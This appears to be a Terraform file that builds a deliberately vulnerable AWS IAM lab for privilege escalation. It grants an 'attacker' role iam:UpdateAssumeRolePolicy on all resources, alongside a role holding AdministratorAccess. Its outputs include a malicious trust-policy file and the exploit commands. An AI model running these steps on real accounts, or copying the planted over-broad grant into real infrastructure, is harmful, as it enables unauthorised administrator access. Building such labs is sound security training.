// main.tf

variable "random_suffix" {
  description = "Random suffix for resource names"
  type        = string
}

// Get current account ID
data "aws_caller_identity" "current" {}

// Create a privileged role that can be targeted
resource "aws_iam_role" "vuln_update_assume_role_policy_target" {
  name = "vuln-iam-update-assume-role-policy-target-${var.random_suffix}"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = "ec2.amazonaws.com" // Initially can only be assumed by EC2
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  lifecycle {
    ignore_changes = [
      tags,
      tags_all
    ]
  }
}

// Attach administrator permissions to the target role
resource "aws_iam_role_policy_attachment" "vuln_update_assume_role_policy_admin_attach" {
  role       = aws_iam_role.vuln_update_assume_role_policy_target.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

// Create a target user
resource "aws_iam_user" "vuln_update_assume_role_policy_target_user" {
  name          = "vuln-iam-update-assume-role-policy-target-user-${var.random_suffix}"
  force_destroy = true
  path          = "/users/"

  lifecycle {
    ignore_changes = [
      tags,
      tags_all
    ]
  }
}

// Create login profile for the target user
resource "aws_iam_user_login_profile" "vuln_update_assume_role_policy_target_login" {
  user                    = aws_iam_user.vuln_update_assume_role_policy_target_user.name
  password_length         = 20
  password_reset_required = false

  lifecycle {
    ignore_changes = [
      password_length,
      password_reset_required
    ]
  }
}

// Create an attacker role with permissions to update assume role policies
resource "aws_iam_role" "vuln_update_assume_role_policy_attacker" {
  name = "vuln-iam-update-assume-role-policy-attacker-${var.random_suffix}"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${data.aws_caller_identity.current.account_id}:root"
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  lifecycle {
    ignore_changes = [
      tags,
      tags_all
    ]
  }
}

// Create a policy allowing the attacker to update assume role policies and assume roles
resource "aws_iam_policy" "vuln_update_assume_role_policy_permission_policy" {
  name        = "vuln-iam-update-assume-role-policy-permission-policy-${var.random_suffix}"
  description = "Policy that allows updating assume role policies"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "iam:UpdateAssumeRolePolicy",
          "iam:ListRoles",
          "iam:GetRole",
          "sts:AssumeRole"
        ]
        Resource = "*"
      },
      {
        Effect = "Allow"
        Action = [
          "s3:ListAllMyBuckets",
          "s3:GetBucketLocation"
        ]
        Resource = "*"
      }
    ]
  })

  lifecycle {
    ignore_changes = [
      tags,
      tags_all
    ]
  }
}

// Attach the permission policy to the attacker role
resource "aws_iam_role_policy_attachment" "vuln_update_assume_role_policy_permission_attach" {
  role       = aws_iam_role.vuln_update_assume_role_policy_attacker.name
  policy_arn = aws_iam_policy.vuln_update_assume_role_policy_permission_policy.arn
}

// Create a local file with the malicious assume role policy for exploitation
resource "local_file" "malicious_assume_role_policy" {
  content = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${data.aws_caller_identity.current.account_id}:user/${aws_iam_user.vuln_update_assume_role_policy_target_user.name}"
        }
        Action = "sts:AssumeRole"
      }
    ]
  })
  filename = "${path.module}/malicious_assume_role_policy.json"
}

// Output variables
output "vuln_update_assume_role_policy_attacker_role" {
  value       = aws_iam_role.vuln_update_assume_role_policy_attacker.name
  description = "Name of the attacker role with UpdateAssumeRolePolicy permissions"
}

output "vuln_update_assume_role_policy_attacker_role_arn" {
  value       = aws_iam_role.vuln_update_assume_role_policy_attacker.arn
  description = "ARN of the attacker role"
}

output "vuln_update_assume_role_policy_target_role" {
  value       = aws_iam_role.vuln_update_assume_role_policy_target.name
  description = "Name of the target role that can be exploited"
}

output "vuln_update_assume_role_policy_target_role_arn" {
  value       = aws_iam_role.vuln_update_assume_role_policy_target.arn
  description = "ARN of the target role"
}

output "vuln_update_assume_role_policy_target_user" {
  value       = aws_iam_user.vuln_update_assume_role_policy_target_user.name
  description = "Username of the target user who will be given permission to assume the role"
}

output "vuln_update_assume_role_policy_target_user_password" {
  value       = aws_iam_user_login_profile.vuln_update_assume_role_policy_target_login.password
  description = "Initial password for the target user"
  sensitive   = true
}

output "malicious_assume_role_policy_path" {
  value       = local_file.malicious_assume_role_policy.filename
  description = "Path to the malicious assume role policy JSON file for exploitation"
}

output "exploit_command_step1" {
  value       = "aws iam update-assume-role-policy --role-name ${aws_iam_role.vuln_update_assume_role_policy_target.name} --policy-document file://malicious_assume_role_policy.json"
  description = "Command to update the assume role policy to allow the target user to assume the role"
}

output "exploit_command_step2" {
  value       = "aws sts assume-role --role-arn ${aws_iam_role.vuln_update_assume_role_policy_target.arn} --role-session-name PrivEscSession"
  description = "Command for the target user to assume the now-accessible privileged role"
}